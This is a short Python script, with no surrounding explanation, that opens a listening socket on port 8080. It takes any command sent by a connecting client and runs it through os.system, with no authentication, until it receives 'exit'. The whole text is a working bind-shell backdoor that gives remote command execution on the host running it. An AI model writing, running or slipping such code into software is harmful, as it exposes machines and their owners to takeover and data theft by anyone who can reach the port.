import socket
import os
ip = socket.gethostbyname(socket.gethostname())
port = 8080
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((ip, port))
s.listen(1)
c, addr = s.accept()
while True:
    command = c.recv(1024).decode()
    print(command)
    if command == 'exit':
        break
    os.system(command)